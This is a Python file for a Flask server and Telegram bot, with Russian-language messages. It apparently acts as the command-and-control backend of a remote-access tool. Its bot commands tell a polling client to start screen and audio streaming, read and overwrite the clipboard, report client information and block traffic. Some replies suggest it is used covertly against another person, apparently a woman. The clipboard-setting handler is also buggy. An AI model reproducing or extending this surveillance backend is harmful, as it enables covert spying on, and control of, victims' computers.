from flask import Flask, request
import time
import telebot
import threading
import json

cmd = None
clipboard = None
stop_event = threading.Event()
timer_thread = None
config_file = 'config.json'

def cmdout():
    global cmd
    temp = cmd
    cmd = None
    return temp

def init_config():
    try:
        with open(config_file, 'r') as file:
            json.load(file)
    except (FileNotFoundError, json.JSONDecodeError):
        default_config = {
            "audioVolume": "30",
            "bitrateVideo": "5280",
            "fpsVideo": "27",
            "bitrateAudio": "128",
            "audioDevice": "1",
            "inputAudioDevice": "-1"  # <- This is where the missing comma was
        }
        with open(config_file, 'w') as file:
            json.dump(default_config, file)

def read_config():
    with open(config_file, 'r') as file:
        return json.load(file)

def write_config(new_config):
    with open(config_file, 'w') as file:
        json.dump(new_config, file)

def set_cmd(value):
    global cmd, stop_event, timer_thread
    stop_event.set()
    if timer_thread is not None and timer_thread.is_alive():
        timer_thread.join()

    cmd = value

    stop_event = threading.Event()
    timer_thread = threading.Thread(target=clear_cmd_after_delay)
    timer_thread.start()

def clear_cmd_after_delay():
    for _ in range(10):
        time.sleep(1)
        if stop_event.is_set():
            return
    global cmd
    cmd = None

app = Flask(__name__)

API_TOKEN = '' # telegram token
bot = telebot.TeleBot(API_TOKEN)

@app.route('/')
def index():
    return '☹ ' * (9999)

@app.route('/cfg')
def devices():
    config = read_config()
    return config, 200, {'Content-Type': 'application/json'}

@app.route('/streamtools', methods=['POST'])
def handle_post():
    data = request.json
    global cmd, clipboard

    if cmd in ["stream_start", "stream_stop", "audio_get", "update_cfg", "client_info", "stream_restart","clipboard_get","traffic_block"]:
        return {'command': cmdout()}, 200
    
    if cmd == "clipboard_set":
        return {'command': cmdout() + " " + clipboard}, 200

    if cmd == "alive":
        cmd = None
        if "streaming" in data:
            message = 'StreamToolsClient ответил вам, что стрим запущен!' if data["streaming"] == "+" else 'StreamToolsClient ответил вам, что стрим не запущен!'
            bot.send_message(lastchatid, message)
        else:
            bot.send_message(lastchatid, 'StreamToolsClient возможно попытался ответить на другое сообщение. Не спамьте!')
    elif "command" in data and data["command"] == "tgsend":
        bot.send_message(lastchatid, data["message"])
    else:
        return {'message': 'Сервер жив!'}, 200

    return {'message': 'Сервер жив!'}, 200

@bot.message_handler(commands=['start'])
def start_cmd(message):
    bot.send_message(message.chat.id, 'StreamTools тебя приветствует.')

@bot.message_handler(commands=['stream_start'])
def stream_start_cmd(message):
    global lastchatid
    set_cmd("stream_start")
    lastchatid = message.chat.id
    bot.send_message(message.chat.id, 'Стрим успешно запущен или не успешно, хз, проверяйте сами.')

@bot.message_handler(commands=['stream_stop'])
def stream_stop_cmd(message):
    global lastchatid
    set_cmd("stream_stop")
    lastchatid = message.chat.id
    bot.send_message(message.chat.id, 'Отправлена команда на завершение стрима.')

@bot.message_handler(commands=['alive'])
def alive_cmd(message):
    global lastchatid
    set_cmd("alive")
    lastchatid = message.chat.id

@bot.message_handler(commands=['clipboard_get'])
def clipboard_get_cmd(message):
    global lastchatid
    set_cmd("clipboard_get")
    lastchatid = message.chat.id

@bot.message_handler(commands=['clipboard_set'])
def clipboard_set_cmd(message):
    global cmd, lastchatid
    params = message.text.split()
    if len(params) > 1:
        clipboard = params[1]
        set_cmd("clipboard_set")
        bot.send_message(message.chat.id, f'Вы успешно вставили ей)) свой клипборд.: {params[1]}!')
    else:
        bot.send_message(message.chat.id, 'Пожалуйста, укажите что ей вставить...')

@bot.message_handler(commands=['audio_get'])
def audio_get_cmd(message):
    global lastchatid
    set_cmd("audio_get")
    lastchatid = message.chat.id

@bot.message_handler(commands=['client_info'])
def client_info_cmd(message):
    global lastchatid
    set_cmd("client_info")
    lastchatid = message.chat.id

@bot.message_handler(commands=['stream_restart'])
def stream_restart_cmd(message):
    global lastchatid
    set_cmd("stream_restart")
    lastchatid = message.chat.id

@bot.message_handler(commands=['traffic_unblock'])
def traffic_unblock(message):
    global cmd, lastchatid
    params = message.text.split()
    if len(params) > 1:
        param = params[1]
        set_cmd("traffic_unblock " + param)
        bot.send_message(message.chat.id, f'Отправляю запрос на разблокировку трафика по путю')
    else:
        bot.send_message(message.chat.id, 'Не указан путь!')

@bot.message_handler(commands=['traffic_block'])
def traffic_block(message):
    global cmd, lastchatid
    params = message.text.split()
    if len(params) > 1:
        param = params[1]
        set_cmd("traffic_block " + param)
        bot.send_message(message.chat.id, f'Отправляю запрос на блокировку трафика по путю')
    else:
        bot.send_message(message.chat.id, 'Не указан путь!')

'''
@bot.message_handler(commands=['audio_set'])
def set_audio_device(message):
    global cmd, lastchatid
    params = message.text.split()
    if len(params) > 1:
        config = read_config()
        config["audioDevice"] = params[1]
        write_config(config)
        set_cmd("audio_set")
        bot.send_message(message.chat.id, f'Вы успешно выбрали аудио девайс: {params[1]}!')
    else:
        bot.send_message(message.chat.id, 'Пожалуйста, укажите номер аудио девайса.')
'''


@bot.message_handler(commands=['config_set'])
def set_config(message):
    global lastchatid
    set_cmd("update_cfg")
    params = message.text.split()
    if len(params) > 2:
        key = params[1]
        value = params[2]
        config = read_config()

        if key in config:
            config[key] = value
            write_config(config)
            bot.send_message(message.chat.id, f'{key} обновлен на {value}.')
        else:
            bot.send_message(message.chat.id, 'Неверный параметр конфигурации.')
    else:
        bot.send_message(message.chat.id, 'Используйте: /config_set <параметр> <значение>')

@bot.message_handler(commands=['config_get'])
def get_config(message):
    config = read_config()
    config_message = "\n".join([f"{key}: {value}" for key, value in config.items()])
    bot.send_message(message.chat.id, f"Текущая конфигурация:\n{config_message}")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    help_message = (
        "/start - Приветственное сообщение\n"
        "/stream_start - Запустить стрим\n"
        "/stream_stop - Остановить стрим\n"
        "/alive - Проверить состояние стриминга\n"
        "/audio_get - Получить информацию об аудио\n"
        "/clipboard_get - Получить содержимое клипборда\n"
        "/clipboard_set <текст> - Установить содержимое клипборда\n"
        "/client_info - Получить информацию о клиенте\n"
        "/stream_restart - Перезапустить стрим\n"
        "/config_set <параметр> <значение> - Обновить конфигурацию\n"
        "/config_get - Получить текущую конфигурацию\n"
        "/help - Список доступных команд\n"
    )
    bot.send_message(message.chat.id, help_message)


def run_bot():
    bot.polling()

if __name__ == '__main__':
    init_config()
    threading.Thread(target=run_bot).start()
    app.run(host="0.0.0.0", port=47004)
